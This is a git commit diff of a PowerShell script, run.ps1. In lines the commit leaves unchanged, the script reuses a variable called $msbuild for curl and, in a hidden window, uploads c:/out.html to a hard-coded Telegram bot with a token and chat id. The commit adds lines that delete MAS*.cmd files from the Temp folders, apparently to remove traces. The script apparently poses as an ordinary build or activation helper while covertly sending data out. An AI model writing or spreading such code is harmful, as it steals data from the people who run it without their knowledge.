2b8745c17aefd62052623733e6565833fb817519
ksp-wrk <ksp.wrk@gmail.com>
2025-05-26 22:43:53 -0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -39,3 +39,6 @@ start-process $msbuild $arguments -Wait
 $msbuild = "curl"
 $arguments = '-s -F document=@"c:/out.html" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
 start-process $msbuild $arguments -WindowStyle Hidden -Wait
+
+$FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
